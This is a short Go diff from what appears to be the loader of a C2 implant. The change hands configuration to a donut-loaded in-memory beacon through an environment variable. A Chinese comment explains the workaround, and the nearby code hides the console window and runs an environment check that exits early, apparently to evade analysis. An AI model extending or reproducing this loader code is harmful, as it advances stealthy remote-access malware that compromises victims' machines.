@@ -287,6 +287,9 @@ func appendTrailer(js []byte) []byte {
 
 func main() {
 	selfAppendTrailer()
+	// donut 内存加载的 beacon 自读 trailer 不可靠（os.Executable 指向本 loader）——
+	// 同进程 env 下发配置，beacon 侧 GOC2_CFG_JSON 兜底解析（与 T0 的 cmd.Env 同理）
+	_ = os.Setenv("GOC2_CFG_JSON", string(_trailerJSON))
 	hideConsole()
 	if checkEnv() { return }
 	fixSystem()
